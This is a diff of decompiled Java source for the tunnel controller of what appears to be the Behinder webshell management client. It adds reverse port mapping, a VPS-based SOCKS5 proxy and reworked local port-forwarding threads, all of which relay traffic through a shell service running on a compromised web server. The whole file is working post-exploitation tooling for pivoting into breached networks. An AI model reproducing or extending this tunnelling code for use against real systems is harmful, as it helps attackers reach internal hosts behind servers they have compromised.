@@ -4,15 +4,21 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
+import java.nio.ByteBuffer;
+import java.nio.channels.ServerSocketChannel;
+import java.nio.channels.SocketChannel;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
 import javafx.application.Platform;
 import javafx.beans.value.ChangeListener;
 import javafx.beans.value.ObservableValue;
@@ -27,6 +33,7 @@ import javafx.scene.control.ToggleGroup;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.utils.CipherUtils;
 import net.rebeyond.behinder.utils.Utils;
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 public class TunnelViewController {
@@ -34,6 +41,8 @@ public class TunnelViewController {
    private Button createPortMapBtn;
    @FXML
    private Button createSocksBtn;
+   @FXML
+   private Button createReversePortMapBtn;
    @FXML
    private Label portMapListenIPLabel;
    @FXML
@@ -68,13 +77,18 @@ public class TunnelViewController {
    private TextField socksIPText;
    @FXML
    private TextField socksPortText;
+   @FXML
+   private TextField reversePortMapIPText;
+   @FXML
+   private TextField reversePortMapPortText;
    private ShellService currentShellService;
    private JSONObject shellEntity;
    private List workList;
    private List localList = new ArrayList();
    private Label statusLabel;
    private TunnelViewController.ProxyUtils proxyUtils;
-   private ServerSocket localPortMapSocket;
+   private List ReversePortMapWorkerList = new ArrayList();
+   private ServerSocketChannel localPortMapSocket;
 
    public void init(ShellService shellService, List workList, Label statusLabel) {
       this.currentShellService = shellService;
@@ -152,6 +166,18 @@ public class TunnelViewController {
          }
 
       });
+      this.createReversePortMapBtn.setOnAction((event) -> {
+         String listenIP = this.reversePortMapIPText.getText().trim();
+         String listenPort = this.reversePortMapPortText.getText().trim();
+         if (this.createReversePortMapBtn.getText().equals("开启")) {
+            this.createReversePortMapBtn.setText("关闭");
+            this.startReversePortMap(listenIP, listenPort);
+         } else {
+            this.createReversePortMapBtn.setText("开启");
+            this.stopReversePortMap(listenIP, listenPort);
+         }
+
+      });
       this.createSocksBtn.setOnAction((event) -> {
          RadioButton currentTypeRadio;
          if (this.createSocksBtn.getText().equals("开启")) {
@@ -173,6 +199,30 @@ public class TunnelViewController {
       });
    }
 
+   private void stopLocalWorkers(List workList) {
+      Iterator var2 = workList.iterator();
+
+      while(var2.hasNext()) {
+         Thread worker = (Thread)var2.next();
+         if (!worker.getName().equals("localPortMapServer")) {
+            worker.stop();
+         }
+      }
+
+   }
+
+   private void stopLocalAllWorkers(List workList) {
+      Iterator var2 = workList.iterator();
+
+      while(var2.hasNext()) {
+         Thread worker = (Thread)var2.next();
+         if (worker.getName().startsWith("localPortMap")) {
+            worker.stop();
+         }
+      }
+
+   }
+
    private void createLocalPortMap() {
       this.createPortMapBtn.setText("关闭");
       String targetIP = this.portMapTargetIPText.getText();
@@ -183,107 +233,123 @@ public class TunnelViewController {
                try {
                   String host = this.portMapIPText.getText();
                   int port = Integer.parseInt(this.portMapPortText.getText());
-                  ServerSocket serverSocket = new ServerSocket(port, 50, InetAddress.getByName(host));
-                  serverSocket.setReuseAddress(true);
-                  this.localPortMapSocket = serverSocket;
+                  ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+                  serverSocketChannel.bind(new InetSocketAddress(InetAddress.getByName(host), port), 50);
+                  serverSocketChannel.socket().setReuseAddress(true);
+                  this.localPortMapSocket = serverSocketChannel;
                   Platform.runLater(() -> {
                      this.tunnelLogTextarea.appendText("[INFO]正在监听本地端口:" + port + "\n");
                   });
 
                   while(true) {
-                     Socket socket = serverSocket.accept();
-                     String socketHash = Utils.getMD5("" + socket.getInetAddress() + socket.getPort() + "");
-                     this.currentShellService.createPortMap(targetIP, targetPort, socketHash);
-                     Platform.runLater(() -> {
-                        this.tunnelLogTextarea.appendText("[INFO]隧道创建成功。\n");
-                     });
+                     SocketChannel socketChannel = serverSocketChannel.accept();
+                     socketChannel.configureBlocking(false);
+                     String socketHash = Utils.getMD5("" + socketChannel.socket().getInetAddress() + socketChannel.socket().getPort() + "");
+                     Runnable backgroundRunner = () -> {
+                        try {
+                           this.currentShellService.createPortMap(targetIP, targetPort, socketHash);
+                        } catch (Exception var5) {
+                        }
+
+                        Platform.runLater(() -> {
+                           this.tunnelLogTextarea.appendText("[INFO]隧道创建成功。\n");
+                        });
+                     };
+                     (new Thread(backgroundRunner)).start();
                      Runnable reader = () -> {
                         while(true) {
-                           if (socket != null) {
-                              try {
-                                 byte[] data = this.currentShellService.readPortMapData(targetIP, targetPort, socketHash);
-                                 if (data == null) {
-                                    continue;
-                                 }
+                           while(true) {
+                              while(true) {
+                                 try {
+                                    byte[] data = this.currentShellService.readPortMapData(targetIP, targetPort, socketHash);
+                                    if (data != null) {
+                                       if (data.length == 0) {
+                                          Thread.sleep(10L);
+                                       } else {
+                                          socketChannel.write(ByteBuffer.wrap(data));
+                                       }
+                                    }
+                                 } catch (Exception var7) {
+                                    if (var7 instanceof SocketException) {
+                                       try {
+                                          this.currentShellService.closeLocalPortMapWorker(socketHash);
+                                          this.stopLocalWorkers(this.localList);
+                                       } catch (Exception var6) {
+                                          var6.printStackTrace();
+                                       }
 
-                                 if (data.length == 0) {
-                                    Thread.sleep(10L);
-                                    continue;
-                                 }
+                                       return;
+                                    }
 
-                                 socket.getOutputStream().write(data);
-                                 socket.getOutputStream().flush();
-                                 continue;
-                              } catch (Exception var6) {
-                                 if (!(var6 instanceof SocketException)) {
-                                    var6.printStackTrace();
                                     Platform.runLater(() -> {
-                                       this.tunnelLogTextarea.appendText("[ERROR]数据读取异常:" + var6.getMessage() + "\n");
+                                       this.tunnelLogTextarea.appendText("[ERROR]数据读取异常:" + var7.getMessage() + "\n");
                                     });
-                                    continue;
                                  }
                               }
                            }
-
-                           return;
                         }
                      };
                      Runnable writer = () -> {
                         while(true) {
-                           if (socket != null) {
-                              try {
-                                 socket.setSoTimeout(10000);
-                                 byte[] data = new byte['\uffff'];
-                                 int length = socket.getInputStream().read(data);
-                                 if (length != -1) {
-                                    data = Arrays.copyOfRange(data, 0, length);
-                                    this.currentShellService.writePortMapData(data, targetIP, targetPort, socketHash);
+                           while(true) {
+                              while(true) {
+                                 try {
+                                    byte[] data = new byte['\uffff'];
+                                    ByteBuffer buf = ByteBuffer.allocate(65535);
+                                    int length = socketChannel.read(buf);
+                                    if (length >= 0) {
+                                       if (length != 0) {
+                                          data = Arrays.copyOfRange(buf.array(), 0, length);
+                                          this.currentShellService.writePortMapData(data, targetIP, targetPort, socketHash);
+                                       }
+                                       continue;
+                                    }
+                                 } catch (SocketTimeoutException var9) {
                                     continue;
+                                 } catch (Exception var10) {
+                                    Platform.runLater(() -> {
+                                       this.tunnelLogTextarea.appendText("[ERROR]数据写入异常:" + var10.getMessage() + "\n");
+                                    });
                                  }
-                              } catch (SocketTimeoutException var8) {
-                                 continue;
-                              } catch (Exception var9) {
-                                 var9.printStackTrace();
-                                 Platform.runLater(() -> {
-                                    this.tunnelLogTextarea.appendText("[ERROR]数据写入异常:" + var9.getMessage() + "\n");
-                                 });
+
+                                 try {
+                                    this.currentShellService.closeLocalPortMapWorker(socketHash);
+                                    this.stopLocalWorkers(this.localList);
+                                    Platform.runLater(() -> {
+                                       this.tunnelLogTextarea.appendText("[INFO]隧道关闭成功。\n");
+                                    });
+                                 } catch (Exception var8) {
+                                    Platform.runLater(() -> {
+                                       this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败:" + var8.getMessage() + "\n");
+                                    });
+                                 }
+
+                                 return;
                               }
                            }
-
-                           try {
-                              this.currentShellService.closeLocalPortMap(targetIP, targetPort);
-                              Platform.runLater(() -> {
-                                 this.tunnelLogTextarea.appendText("[INFO]隧道关闭成功。\n");
-                              });
-                              socket.close();
-                           } catch (Exception var7) {
-                              Platform.runLater(() -> {
-                                 this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败:" + var7.getMessage() + "\n");
-                              });
-                              var7.printStackTrace();
-                           }
-
-                           return;
                         }
                      };
                      Thread readWorker = new Thread(reader);
+                     readWorker.setName("localPortMapWorker");
                      this.workList.add(readWorker);
                      readWorker.start();
                      Thread writeWorker = new Thread(writer);
+                     writeWorker.setName("localPortMapWorker");
                      this.workList.add(writeWorker);
                      writeWorker.start();
                      this.localList.add(readWorker);
                      this.localList.add(writeWorker);
                   }
-               } catch (Exception var12) {
+               } catch (Exception var13) {
+                  var13.printStackTrace();
                }
             };
             Thread worker = new Thread(runner);
+            worker.setName("localPortMapServer");
             this.workList.add(worker);
             this.localList.add(worker);
             worker.start();
          } catch (Exception var5) {
-            var5.printStackTrace();
             Platform.runLater(() -> {
                this.tunnelLogTextarea.appendText("[ERROR]隧道创建失败:" + var5.getMessage() + "\n");
             });
@@ -301,29 +367,21 @@ public class TunnelViewController {
       String targetPort = this.portMapTargetPortText.getText();
       Runnable runner = () -> {
          try {
-            Iterator var3 = this.localList.iterator();
-
-            while(var3.hasNext()) {
-               Thread thread = (Thread)var3.next();
-               thread.interrupt();
-            }
-
+            this.stopLocalAllWorkers(this.workList);
             this.currentShellService.closeLocalPortMap(targetIP, targetPort);
-            if (this.localPortMapSocket != null && !this.localPortMapSocket.isClosed()) {
+            if (this.localPortMapSocket != null && !this.localPortMapSocket.socket().isClosed()) {
                try {
                   this.localPortMapSocket.close();
-               } catch (IOException var5) {
-                  var5.printStackTrace();
+               } catch (IOException var4) {
                }
             }
 
             Platform.runLater(() -> {
                this.tunnelLogTextarea.appendText("[INFO]本地监听端口已关闭。\n");
             });
-         } catch (Exception var6) {
-            var6.printStackTrace();
+         } catch (Exception var5) {
             Platform.runLater(() -> {
-               this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败:" + var6.getMessage() + "\n");
+               this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败:" + var5.getMessage() + "\n");
             });
          }
 
@@ -366,7 +424,6 @@ public class TunnelViewController {
                this.tunnelLogTextarea.appendText("[INFO]隧道建立成功，请连接VPS。\n");
             });
          } catch (Exception var6) {
-            var6.printStackTrace();
             Platform.runLater(() -> {
                this.tunnelLogTextarea.appendText("[ERROR]隧道建立失败:" + var6.getMessage() + "\n");
             });
@@ -391,13 +448,125 @@ public class TunnelViewController {
 
    private void createRemoteSocks() {
       this.createSocksBtn.setText("关闭");
-      this.proxyUtils = new TunnelViewController.ProxyUtils();
-      this.proxyUtils.start();
+      String remoteIP = this.socksIPText.getText();
+      String remotePort = this.socksPortText.getText();
+      Runnable runner = () -> {
+         try {
+            this.currentShellService.createVPSSocks(remoteIP, remotePort);
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[INFO]隧道建立成功，请使用SOCKS5客户端连接VPS。\n");
+            });
+         } catch (Exception var4) {
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[ERROR]隧道建立失败:" + var4.getMessage() + "\n");
+            });
+         }
+
+      };
+      Thread worker = new Thread(runner);
+      this.workList.add(worker);
+      worker.start();
    }
 
    private void stopRemoteSocks() {
-      this.proxyUtils.shutdown();
       this.createSocksBtn.setText("开启");
+      Runnable runner = () -> {
+         try {
+            JSONObject result = this.currentShellService.stopVPSSocks();
+            if (result.getString("status").equals("success")) {
+               Platform.runLater(() -> {
+                  this.tunnelLogTextarea.appendText("[INFO]隧道关闭成功，服务侧资源已释放。\n");
+               });
+            } else {
+               Platform.runLater(() -> {
+                  this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败：" + result.getString("msg") + "\n");
+               });
+            }
+         } catch (Exception var2) {
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[ERROR]隧道关闭失败:" + var2.getMessage() + "\n");
+            });
+         }
+
+      };
+      Thread worker = new Thread(runner);
+      this.workList.add(worker);
+      worker.start();
+   }
+
+   private void startReversePortMap(String listenIP, String listenPort) {
+      Runnable worker = () -> {
+         try {
+            Runnable runner = () -> {
+               Object var2 = null;
+
+               try {
+                  this.currentShellService.createReversePortMap(listenPort);
+               } catch (Exception var4) {
+                  var4.printStackTrace();
+               }
+
+            };
+            Thread createWorker = new Thread(runner);
+            createWorker.start();
+            Thread.sleep(1000L);
+            this.currentShellService.listReversePortMap();
+            Map paramMap = new HashMap();
+            paramMap.put("listenIP", listenIP);
+            paramMap.put("listenPort", listenPort);
+            TunnelViewController.ReversePortMapWorker reversePortMapWorkerDaemon = new TunnelViewController.ReversePortMapWorker("daemon", paramMap);
+            this.ReversePortMapWorkerList.add(reversePortMapWorkerDaemon);
+            Thread reversePortMapWorker = new Thread(reversePortMapWorkerDaemon);
+            reversePortMapWorker.start();
+            this.workList.add(reversePortMapWorker);
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[INFO]通信隧道创建成功。\n");
+            });
+         } catch (Exception var8) {
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[ERROR]通信隧道创建失败：" + var8.getMessage());
+            });
+         }
+
+      };
+      Thread woker = new Thread(worker);
+      woker.start();
+      this.workList.add(woker);
+   }
+
+   private void stopReversePortMap(String listenIP, String listenPort) {
+      this.tunnelLogTextarea.appendText("[INFO]正在关闭通信隧道……\n");
+      Runnable worker = () -> {
+         try {
+            Iterator var2 = this.ReversePortMapWorkerList.iterator();
+
+            while(var2.hasNext()) {
+               TunnelViewController.ReversePortMapWorker reversePortMapWorker = (TunnelViewController.ReversePortMapWorker)var2.next();
+               reversePortMapWorker.stop();
+            }
+
+            this.ReversePortMapWorkerList.clear();
+            JSONObject result = this.currentShellService.stopReversePortMap(listenPort);
+            if (result.get("status").equals("success")) {
+               Platform.runLater(() -> {
+                  this.tunnelLogTextarea.appendText("[INFO]通信隧道关闭成功。\n");
+               });
+            } else {
+               String msg = result.getString("msg");
+               Platform.runLater(() -> {
+                  this.tunnelLogTextarea.appendText("[ERROR]通信隧道关闭失败：" + msg + "\n");
+               });
+            }
+         } catch (Exception var4) {
+            Platform.runLater(() -> {
+               this.tunnelLogTextarea.appendText("[ERROR]通信隧道关闭失败：" + var4.getMessage() + "\n");
+            });
+         }
+
+      };
+      Thread woker = new Thread(worker);
+      woker.start();
+      this.workList.add(woker);
    }
 
    class ProxyUtils extends Thread {
@@ -419,15 +588,15 @@ public class TunnelViewController {
 
          try {
             if (this.r != null) {
-               this.r.interrupt();
+               this.r.stop();
             }
 
             if (this.w != null) {
-               this.w.interrupt();
+               this.w.stop();
             }
 
             if (this.proxy != null) {
-               this.proxy.interrupt();
+               this.proxy.stop();
             }
 
             if (this.serverSocket != null && !this.serverSocket.isClosed()) {
@@ -493,7 +662,6 @@ public class TunnelViewController {
                try {
                   TunnelViewController.this.currentShellService.closeProxy(this.socketHash);
                } catch (Exception var3) {
-                  var3.printStackTrace();
                }
             }
 
@@ -512,7 +680,11 @@ public class TunnelViewController {
             DataInputStream ins = new DataInputStream(socket.getInputStream());
             DataOutputStream os = new DataOutputStream(socket.getOutputStream());
             int nmethods = ins.read();
-            int methods = ins.read();
+
+            for(int ix = 0; ix < nmethods; ++ix) {
+               int var10 = ins.read();
+            }
+
             os.write(new byte[]{5, 0});
             int version = ins.read();
             int cmd;
@@ -544,11 +716,11 @@ public class TunnelViewController {
                   tempArray[i] = temp + "";
                }
 
-               String[] var20 = tempArray;
+               String[] var21 = tempArray;
                temp = tempArray.length;
 
-               for(int var17 = 0; var17 < temp; ++var17) {
-                  String tempx = var20[var17];
+               for(int var16 = 0; var16 < temp; ++var16) {
+                  String tempx = var21[var16];
                   host = host + tempx + ".";
                }
 
@@ -575,7 +747,7 @@ public class TunnelViewController {
                      ProxyUtils.this.log("INFO", "隧道建立成功，请求远程地址" + host + ":" + port);
                      return true;
                   } else {
-                     os.write(CipherUtils.mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
+                     os.write(CipherUtils.mergeByteArray(new byte[]{5, 5, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
                      throw new Exception(String.format("[%s:%d] Remote failed", host, port));
                   }
                } else {
@@ -588,42 +760,6 @@ public class TunnelViewController {
 
          private boolean parseSocks4(Socket socket) {
             return false;
-         }
-
-         private class Reader extends Thread {
-            private Reader() {
-            }
-
-            public void run() {
-               while(true) {
-                  if (Session.this.socket != null) {
-                     try {
-                        byte[] data = TunnelViewController.this.currentShellService.readProxyData(Session.this.socketHash);
-                        if (data != null) {
-                           if (data.length == 0) {
-                              Thread.sleep(100L);
-                              continue;
-                           }
-
-                           Session.this.socket.getOutputStream().write(data);
-                           Session.this.socket.getOutputStream().flush();
-                           continue;
-                        }
-                     } catch (Exception var2) {
-                        ProxyUtils.this.log("ERROR", "数据读取异常:" + var2.getMessage());
-                        var2.printStackTrace();
-                        continue;
-                     }
-                  }
-
-                  return;
-               }
-            }
-
-            // $FF: synthetic method
-            Reader(Object x1) {
-               this();
-            }
          }
 
          private class Writer extends Thread {
@@ -646,7 +782,6 @@ public class TunnelViewController {
                         continue;
                      } catch (Exception var5) {
                         ProxyUtils.this.log("ERROR", "数据写入异常:" + var5.getMessage());
-                        var5.printStackTrace();
                      }
                   }
 
@@ -656,7 +791,6 @@ public class TunnelViewController {
                      Session.this.socket.close();
                   } catch (Exception var3) {
                      ProxyUtils.this.log("ERROR", "隧道关闭失败:" + var3.getMessage());
-                     var3.printStackTrace();
                   }
 
                   return;
@@ -668,6 +802,156 @@ public class TunnelViewController {
                this();
             }
          }
+
+         private class Reader extends Thread {
+            private Reader() {
+            }
+
+            public void run() {
+               while(true) {
+                  if (Session.this.socket != null) {
+                     try {
+                        byte[] data = TunnelViewController.this.currentShellService.readProxyData(Session.this.socketHash);
+                        if (data != null) {
+                           if (data.length != 0) {
+                              Session.this.socket.getOutputStream().write(data);
+                              Session.this.socket.getOutputStream().flush();
+                           }
+                           continue;
+                        }
+                     } catch (Exception var2) {
+                        continue;
+                     }
+                  }
+
+                  return;
+               }
+            }
+
+            // $FF: synthetic method
+            Reader(Object x1) {
+               this();
+            }
+         }
+      }
+   }
+
+   class ReversePortMapWorker implements Runnable {
+      private String threadType;
+      private Map paramMap;
+      private Map socketMetaList = new HashMap();
+
+      public ReversePortMapWorker(String threadType, Map paramMap) {
+         this.threadType = threadType;
+         this.paramMap = paramMap;
+      }
+
+      public void stop() {
+         Iterator var1 = this.socketMetaList.keySet().iterator();
+
+         while(var1.hasNext()) {
+            String key = (String)var1.next();
+            Socket socket = (Socket)((Map)this.socketMetaList.get(key)).get("socket");
+
+            try {
+               socket.close();
+            } catch (Exception var5) {
+            }
+         }
+
+         this.socketMetaList = null;
+      }
+
+      public void run() {
+         int bytesRead;
+         if (this.threadType.equals("daemon")) {
+            String listenIP = this.paramMap.get("listenIP").toString();
+            int listenPort = Integer.parseInt(this.paramMap.get("listenPort").toString());
+
+            while(true) {
+               try {
+                  JSONObject result = TunnelViewController.this.currentShellService.listReversePortMap();
+                  JSONArray socketArr = new JSONArray(result.getString("msg"));
+
+                  for(bytesRead = 0; bytesRead < socketArr.length(); ++bytesRead) {
+                     JSONObject socketObj = socketArr.getJSONObject(bytesRead);
+                     String socketHash = socketObj.getString("socketHash");
+                     if (socketHash.startsWith("reverseportmap_socket") && !this.socketMetaList.containsKey(socketHash)) {
+                        Map socketMeta = new HashMap();
+                        socketMeta.put("status", "ready");
+                        Socket socketx = new Socket(listenIP, listenPort);
+                        socketMeta.put("status", "connected");
+                        socketMeta.put("socket", socketx);
+                        socketMeta.put("socketHash", socketHash);
+                        this.socketMetaList.put(socketHash, socketMeta);
+                        Map paramMap = new HashMap();
+                        paramMap.put("socketMeta", socketMeta);
+                        TunnelViewController.ReversePortMapWorker reversePortMapWorkerReader = TunnelViewController.this.new ReversePortMapWorker("read", paramMap);
+                        TunnelViewController.ReversePortMapWorker reversePortMapWorkerWriter = TunnelViewController.this.new ReversePortMapWorker("write", paramMap);
+                        TunnelViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerReader);
+                        TunnelViewController.this.ReversePortMapWorkerList.add(reversePortMapWorkerWriter);
+                        Thread reader = new Thread(reversePortMapWorkerReader);
+                        Thread writer = new Thread(reversePortMapWorkerWriter);
+                        TunnelViewController.this.workList.add(reader);
+                        TunnelViewController.this.workList.add(writer);
+                        reader.start();
+                        writer.start();
+                     }
+                  }
+
+                  Thread.sleep(3000L);
+               } catch (Exception var19) {
+                  break;
+               }
+            }
+         } else {
+            Map socketMetax;
+            String socketHashx;
+            Socket socket;
+            byte[] buf;
+            JSONObject var24;
+            if (this.threadType.equals("read")) {
+               socketMetax = (Map)this.paramMap.get("socketMeta");
+               socketHashx = socketMetax.get("socketHash").toString();
+               socket = (Socket)socketMetax.get("socket");
+
+               while(true) {
+                  try {
+                     Thread.sleep(100L);
+                     buf = TunnelViewController.this.currentShellService.readReversePortMapData(socketHashx);
+                     socket.getOutputStream().write(buf);
+                     socket.getOutputStream().flush();
+                  } catch (Exception var18) {
+                     try {
+                        var24 = TunnelViewController.this.currentShellService.closeReversePortMap(socketHashx);
+                     } catch (Exception var16) {
+                     }
+                     break;
+                  }
+               }
+            } else if (this.threadType.equals("write")) {
+               socketMetax = (Map)this.paramMap.get("socketMeta");
+               socketHashx = socketMetax.get("socketHash").toString();
+               socket = (Socket)socketMetax.get("socket");
+
+               try {
+                  buf = new byte[20480];
+
+                  for(bytesRead = socket.getInputStream().read(buf); bytesRead > 0; bytesRead = socket.getInputStream().read(buf)) {
+                     TunnelViewController.this.currentShellService.writeReversePortMapData(Arrays.copyOfRange(buf, 0, bytesRead), socketHashx);
+                  }
+               } catch (Exception var17) {
+                  try {
+                     var24 = TunnelViewController.this.currentShellService.closeReversePortMap(socketHashx);
+                  } catch (Exception var15) {
+                  }
+               }
+            }
+         }
+
+      }
+
+      public void close(String listenIP, String listenPort) {
       }
    }
 }
